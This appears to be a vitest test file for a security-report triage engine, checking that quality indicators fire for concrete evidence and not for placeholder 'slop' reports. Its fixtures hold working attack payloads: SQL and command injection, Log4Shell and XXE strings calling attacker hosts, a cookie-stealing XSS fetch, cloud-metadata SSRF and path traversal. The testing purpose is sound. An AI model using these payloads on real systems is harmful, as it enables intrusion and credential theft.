// Task #174 — additional default-path GOLD_SIGNAL category tests.
//
// Verifies that the categories added in gold-signals.ts (mirroring AVRI
// family rubrics) emit GOLD_SIGNAL indicators for genuinely
// well-evidenced reports AND, critically, do NOT emit them for slop
// reports whose only "evidence" is a placeholder / fabricated stand-in
// (e.g. `<sql payload here>`, `Bearer <token>`, `<!ENTITY xxe SYSTEM
// "<file path>">`).
//
// Each category has at least one positive case and one negative
// (fabricated/placeholder) case. Tests run runEngine2 end-to-end so
// they exercise the real pipeline (extractSignals → runEngine2 →
// indicator emission).

import { describe, it, expect } from "vitest";
import { runEngine2 } from "./engines";
import { extractSignals } from "./extractors";

function goldValues(text: string, claimedCwes: string[] = []): string[] {
  const sig = extractSignals(text, claimedCwes);
  const e2 = runEngine2(sig, text);
  return e2.triggeredIndicators
    .filter((i) => i.signal === "GOLD_SIGNAL")
    .map((i) => String(i.value));
}

// All payload-bearing categories need at least one typed evidence
// signal in `evidenceSignals` for the GOLD_SIGNAL block to run, so
// every fixture below includes a fenced code block (CODE_DIFF / shell /
// crash / file path / etc.) along with the category-specific evidence.

describe("Task #174: additional default-path GOLD_SIGNAL categories", () => {
  // -----------------------------------------------------------------
  // AUTHN_AUTHZ — auth_token
  // -----------------------------------------------------------------
  describe("auth_token", () => {
    it("emits auth_token for a concrete JWT bearer header", () => {
      const text = `
# IDOR via /api/orders

\`\`\`
GET /api/orders/4815 HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyXzEifQ.M2y7fT_kQpL9Ztq8RxYbN3wVcGdHaJoP5sB1uEiKxzA
User-Agent: curl/8.4.0
\`\`\`

The second account using a different bearer token receives the same body.
`;
      expect(goldValues(text)).toContain("auth_token");
    });

    it("emits auth_token for a non-placeholder session cookie", () => {
      const text = `
# Session takeover

The endpoint accepts the following session cookie regardless of origin:

\`\`\`
GET /account HTTP/1.1
Host: bank.example.com
Cookie: sessionid=abc123XYZdef456ghi789jklMNO; remember=1
\`\`\`
`;
      expect(goldValues(text)).toContain("auth_token");
    });

    it("does NOT emit auth_token when the bearer token is a placeholder", () => {
      const text = `
# IDOR

\`\`\`
GET /api/orders/4815 HTTP/1.1
Host: api.example.com
Authorization: Bearer <jwt-token-here>
\`\`\`

Replace \`<jwt-token-here>\` with the victim's bearer token.
`;
      expect(goldValues(text)).not.toContain("auth_token");
    });

    it("does NOT emit auth_token for a YOUR_TOKEN-style placeholder", () => {
      const text = `
\`\`\`
GET /admin HTTP/1.1
Host: target.com
Authorization: Bearer YOUR_TOKEN_HERE
\`\`\`
`;
      expect(goldValues(text)).not.toContain("auth_token");
    });
  });

  // -----------------------------------------------------------------
  // INJECTION — sql_injection_payload
  // -----------------------------------------------------------------
  describe("sql_injection_payload", () => {
    it("emits sql_injection_payload for a concrete UNION SELECT payload", () => {
      const text = `
# SQLi in /search

The \`q\` parameter is concatenated unsanitized:

\`\`\`http
POST /search HTTP/1.1
Host: shop.example.com
Content-Type: application/x-www-form-urlencoded

q=' UNION SELECT username, password FROM users--
\`\`\`

Source: src/handlers/search.py:42
`;
      expect(goldValues(text, ["CWE-89"])).toContain("sql_injection_payload");
    });

    it("emits sql_injection_payload for a SLEEP-based blind payload", () => {
      const text = `
# Blind SQLi via id parameter

\`\`\`
GET /api/items?id=1' AND SLEEP(5)-- HTTP/1.1
Host: api.example.com
\`\`\`

Source file: src/api/items.rb:88
`;
      expect(goldValues(text, ["CWE-89"])).toContain("sql_injection_payload");
    });

    it("does NOT emit sql_injection_payload when the payload slot is a placeholder", () => {
      const text = `
# SQLi report

\`\`\`
POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

q=<sql payload here>
\`\`\`

Payload: \`<inject>\` against the search endpoint.
`;
      expect(goldValues(text, ["CWE-89"])).not.toContain("sql_injection_payload");
    });
  });

  // -----------------------------------------------------------------
  // INJECTION — command_injection_payload
  // -----------------------------------------------------------------
  describe("command_injection_payload", () => {
    it("emits command_injection_payload for a concrete ;cat /etc/passwd payload", () => {
      const text = `
# Command injection in /api/diag

\`\`\`bash
$ curl 'https://api.example.com/api/diag?host=localhost; cat /etc/passwd'
\`\`\`

Source: src/api/diag.go:31
`;
      expect(goldValues(text, ["CWE-78"])).toContain("command_injection_payload");
    });

    it("emits command_injection_payload for a JNDI Log4Shell payload", () => {
      const text = `
# Log4Shell in user-agent

\`\`\`
GET / HTTP/1.1
Host: api.example.com
User-Agent: \${jndi:ldap://attacker.example.com/exploit}
\`\`\`
`;
      expect(goldValues(text, ["CWE-917"])).toContain("command_injection_payload");
    });

    it("does NOT emit command_injection_payload for a placeholder slot", () => {
      const text = `
# Command injection

\`\`\`
POST /api/run HTTP/1.1
Host: target.com
Content-Type: application/json

{ "cmd": "<command here>" }
\`\`\`

Send: \`<inject>\` to /api/run.
`;
      expect(goldValues(text, ["CWE-78"])).not.toContain("command_injection_payload");
    });
  });

  // -----------------------------------------------------------------
  // WEB_CLIENT — xss_payload
  // -----------------------------------------------------------------
  describe("xss_payload", () => {
    it("emits xss_payload for a concrete script tag with active sink", () => {
      const text = `
# Stored XSS in /comments

The comment field is rendered unescaped. Posting:

\`\`\`html
<script>alert(document.cookie)</script>
\`\`\`

…causes every visitor to /post/123 to execute the payload.

Source: src/render/comment.tsx:94
`;
      expect(goldValues(text, ["CWE-79"])).toContain("xss_payload");
    });

    it("emits xss_payload for an onerror img payload", () => {
      const text = `
# Reflected XSS in q parameter

\`\`\`
GET /search?q=<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)> HTTP/1.1
Host: app.example.com
\`\`\`

Source: src/views/search.html.erb:12
`;
      expect(goldValues(text, ["CWE-79"])).toContain("xss_payload");
    });

    it("does NOT emit xss_payload for placeholder/no-sink markers", () => {
      const text = `
# XSS report

The vulnerable parameter accepts an XSS payload:

\`\`\`
GET /search?q=<payload here> HTTP/1.1
Host: target.com
\`\`\`

Inject: \`<script>\` into the q parameter.
`;
      expect(goldValues(text, ["CWE-79"])).not.toContain("xss_payload");
    });
  });

  // -----------------------------------------------------------------
  // WEB_CLIENT — ssrf_metadata_target
  // -----------------------------------------------------------------
  describe("ssrf_metadata_target", () => {
    it("emits ssrf_metadata_target for AWS metadata IAM credentials URL", () => {
      const text = `
# SSRF in image fetcher

The /api/fetch?url= parameter blindly fetches any URL:

\`\`\`
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin HTTP/1.1
Host: app.example.com
\`\`\`

Source: src/api/fetch.py:18
`;
      expect(goldValues(text, ["CWE-918"])).toContain("ssrf_metadata_target");
    });

    it("emits ssrf_metadata_target for GCP computeMetadata URL", () => {
      const text = `
# GCP SSRF

\`\`\`
GET /api/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: app.example.com
Metadata-Flavor: Google
\`\`\`
`;
      expect(goldValues(text, ["CWE-918"])).toContain("ssrf_metadata_target");
    });

    it("does NOT emit ssrf_metadata_target for a generic 'metadata endpoint' mention", () => {
      const text = `
# SSRF report

The endpoint can be used to access the cloud metadata service. Use \`<metadata-url>\`
as the URL parameter to retrieve credentials.

\`\`\`
GET /api/fetch?url=<metadata-url> HTTP/1.1
Host: target.com
\`\`\`
`;
      expect(goldValues(text, ["CWE-918"])).not.toContain("ssrf_metadata_target");
    });
  });

  // -----------------------------------------------------------------
  // WEB_CLIENT — path_traversal_payload
  // -----------------------------------------------------------------
  describe("path_traversal_payload", () => {
    it("emits path_traversal_payload for ../../etc/passwd", () => {
      const text = `
# Path traversal in /download?file=

\`\`\`
GET /download?file=../../../../etc/passwd HTTP/1.1
Host: app.example.com
\`\`\`

Source: src/api/download.go:21
`;
      expect(goldValues(text, ["CWE-22"])).toContain("path_traversal_payload");
    });

    it("emits path_traversal_payload for URL-encoded ..%2f..%2fetc%2fshadow", () => {
      const text = `
# Encoded traversal

\`\`\`
GET /api/file?p=..%2f..%2f..%2fetc%2fshadow HTTP/1.1
Host: app.example.com
\`\`\`
`;
      expect(goldValues(text, ["CWE-22"])).toContain("path_traversal_payload");
    });

    it("does NOT emit path_traversal_payload when target is a placeholder", () => {
      const text = `
# Path traversal

\`\`\`
GET /download?file=../../<sensitive-file> HTTP/1.1
Host: target.com
\`\`\`

Send: \`<traversal>\` to read system files.
`;
      expect(goldValues(text, ["CWE-22"])).not.toContain("path_traversal_payload");
    });
  });

  // -----------------------------------------------------------------
  // DESERIALIZATION — xxe_external_entity
  // -----------------------------------------------------------------
  describe("xxe_external_entity", () => {
    it("emits xxe_external_entity for a concrete file:// SYSTEM entity", () => {
      const text = `
# XXE in /api/import

The XML body is parsed with external entities enabled (DocumentBuilder
without FEATURE_SECURE_PROCESSING).

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
\`\`\`

Source: src/api/import.java:67
`;
      expect(goldValues(text, ["CWE-611"])).toContain("xxe_external_entity");
    });

    it("emits xxe_external_entity for an http:// out-of-band URI", () => {
      const text = `
# XXE OOB

The /api/import endpoint parses the body with libxml2 and external entity
loading enabled (XML_PARSE_NOENT). Source: src/api/Importer.java:118.

\`\`\`xml
<!DOCTYPE x [
  <!ENTITY exfil SYSTEM "http://attacker.example.com/oob?d=1">
]>
<x>&exfil;</x>
\`\`\`
`;
      expect(goldValues(text, ["CWE-611"])).toContain("xxe_external_entity");
    });

    it("does NOT emit xxe_external_entity when SYSTEM URI is a placeholder", () => {
      const text = `
# XXE template

\`\`\`xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://<placeholder>">
]>
<foo>&xxe;</foo>
\`\`\`

Replace \`<placeholder>\` with the file you want to read.
`;
      expect(goldValues(text, ["CWE-611"])).not.toContain("xxe_external_entity");
    });
  });

  // -----------------------------------------------------------------
  // DESERIALIZATION — deserialization_gadget
  // -----------------------------------------------------------------
  describe("deserialization_gadget", () => {
    it("emits deserialization_gadget for a ysoserial CommonsCollections1 payload", () => {
      const text = `
# Java deserialization RCE

Generated the payload with:

\`\`\`bash
$ java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.example.com/$(id)' | base64
\`\`\`

POSTed to /api/import to trigger ObjectInputStream.readObject().

Source: src/api/Importer.java:118
`;
      expect(goldValues(text, ["CWE-502"])).toContain("deserialization_gadget");
    });

    it("emits deserialization_gadget for pickle.loads with raw bytes", () => {
      const text = `
# Python pickle RCE

\`\`\`python
import pickle
payload = pickle.loads(b'\\x80\\x04\\x95\\x1a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x02os\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x02id\\x94\\x85\\x94R\\x94.')
\`\`\`

Source: src/api/loader.py:33
`;
      expect(goldValues(text, ["CWE-502"])).toContain("deserialization_gadget");
    });

    it("does NOT emit deserialization_gadget for a name-only mention", () => {
      const text = `
# Deserialization

This service deserializes user input. An attacker could use a deserialization
gadget chain (e.g. ysoserial) to execute arbitrary code.

\`\`\`
POST /api/import HTTP/1.1
Host: target.com

<payload>
\`\`\`
`;
      expect(goldValues(text, ["CWE-502"])).not.toContain("deserialization_gadget");
    });
  });

  // -----------------------------------------------------------------
  // CRYPTO — crypto_misuse
  // -----------------------------------------------------------------
  describe("crypto_misuse", () => {
    it("emits crypto_misuse for a hardcoded static IV", () => {
      const text = `
# AES-CBC reused with static IV

\`\`\`go
// src/crypto/encrypt.go:42
var staticIV = []byte("0123456789abcdef") // hardcoded IV reused for every message
block, _ := aes.NewCipher(key)
mode := cipher.NewCBCEncrypter(block, staticIV)
\`\`\`

Every ciphertext encrypts with the same fixed IV, leaking equality of plaintext blocks.
`;
      expect(goldValues(text, ["CWE-329"])).toContain("crypto_misuse");
    });

    it("emits crypto_misuse for explicit ECB mode usage", () => {
      const text = `
# AES/ECB mode in legacy session cookie

\`\`\`java
// src/auth/SessionCipher.java:88
Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
c.init(Cipher.ENCRYPT_MODE, key);
\`\`\`

ECB mode preserves block patterns, so identical 16-byte blocks encrypt to identical ciphertexts.
`;
      expect(goldValues(text, ["CWE-327"])).toContain("crypto_misuse");
    });

    it("emits crypto_misuse for hashlib.md5 password hashing", () => {
      const text = `
# Password hashes via MD5

\`\`\`python
# src/auth/passwords.py:14
import hashlib
hashed = hashlib.md5(password.encode()).hexdigest()
\`\`\`
`;
      expect(goldValues(text, ["CWE-327"])).toContain("crypto_misuse");
    });

    it("does NOT emit crypto_misuse for a vague 'uses weak crypto' claim", () => {
      const text = `
# Crypto issue

The service uses weak crypto with a hardcoded <KEY> for all sessions.
Specifically, MD5(<HASH>) is used to derive the key.

\`\`\`
GET /session HTTP/1.1
Host: target.com
\`\`\`
`;
      expect(goldValues(text, ["CWE-327"])).not.toContain("crypto_misuse");
    });
  });

  // -----------------------------------------------------------------
  // RACE_CONCURRENCY — filesystem_toctou
  // -----------------------------------------------------------------
  describe("filesystem_toctou", () => {
    it("emits filesystem_toctou for an access(2) → open(2) sequence in C", () => {
      const text = `
# TOCTOU in setuid wrapper

\`\`\`c
// src/wrapper/main.c:204
if (access(user_path, R_OK) != 0) {
    return -EACCES;
}
// ...attacker swaps user_path → /etc/shadow via symlink here...
fd = open(user_path, O_RDONLY);
\`\`\`

Reproduce by spawning a tight loop that flips the symlink between an
attacker-readable file and /etc/shadow.
`;
      expect(goldValues(text, ["CWE-367"])).toContain("filesystem_toctou");
    });

    it("emits filesystem_toctou for a shell-script stat → openat sequence", () => {
      const text = `
# Shell TOCTOU

The pre-commit hook does:

\`\`\`sh
# scripts/precommit.sh:12
stat /tmp/buildconfig
openat AT_FDCWD /tmp/buildconfig O_RDONLY
\`\`\`

A symlink swap between the two calls escalates to root reads of arbitrary files.
`;
      expect(goldValues(text, ["CWE-367"])).toContain("filesystem_toctou");
    });

    it("does NOT emit filesystem_toctou for placeholder argument slots", () => {
      const text = `
# TOCTOU report

The pattern is:

\`\`\`c
access(<file>);
// race window
open(<file>);
\`\`\`

Inject a symlink swap during the race window.
`;
      expect(goldValues(text, ["CWE-367"])).not.toContain("filesystem_toctou");
    });
  });

  // -----------------------------------------------------------------
  // Cross-cutting: existing curated three are not regressed
  // -----------------------------------------------------------------
  it("preserves the curated code_diff GOLD_SIGNAL alongside new categories", () => {
    const text = `
# Heap-buffer-overflow patch (CWE-122)

\`\`\`diff
--- a/src/parser.c
+++ b/src/parser.c
@@ -42,7 +42,7 @@ int parse_token(const char *buf, size_t len) {
-    memcpy(out, buf, len);
+    memcpy(out, buf, MIN(len, sizeof(out)));
\`\`\`

Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyXzEifQ.M2y7fT_kQpL9Ztq8RxYbN3wVcGdHaJoP5sB1uEiKxzA
`;
    const golds = goldValues(text, ["CWE-122"]);
    expect(golds).toContain("code_diff");
    expect(golds).toContain("auth_token");
  });

  it("emits no GOLD_SIGNAL on a slop report with only placeholder evidence", () => {
    const text = `
# Critical SQLi + XSS + SSRF + XXE + Deserialization + Path Traversal

This vulnerability could potentially allow an attacker to execute arbitrary
code. The application is critically vulnerable.

\`\`\`
GET /api/<endpoint>?q=<sql payload here> HTTP/1.1
Host: <target>
Authorization: Bearer <token>
\`\`\`

Payloads to use:
- SQLi: \`<inject>\`
- XSS: \`<script>\`
- SSRF: \`<metadata-url>\`
- XXE: \`<entity>\`
- Path traversal: \`<path>\`

Apply security patches and use strong passwords.
`;
    const golds = goldValues(text, ["CWE-89"]);
    expect(golds).toEqual([]);
  });
});
